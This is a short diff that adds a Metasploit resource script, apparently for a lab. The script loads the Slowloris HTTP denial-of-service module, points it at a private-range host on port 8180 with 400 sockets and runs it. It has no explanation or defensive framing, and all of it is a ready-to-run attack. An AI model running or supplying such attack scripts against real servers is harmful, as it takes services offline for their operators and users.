@@ -1,0 +1,7 @@
+
+use auxiliary/dos/http/slowloris
+set rhost 192.168.156.75
+set rport 8180
+set sockets 400
+options
+run
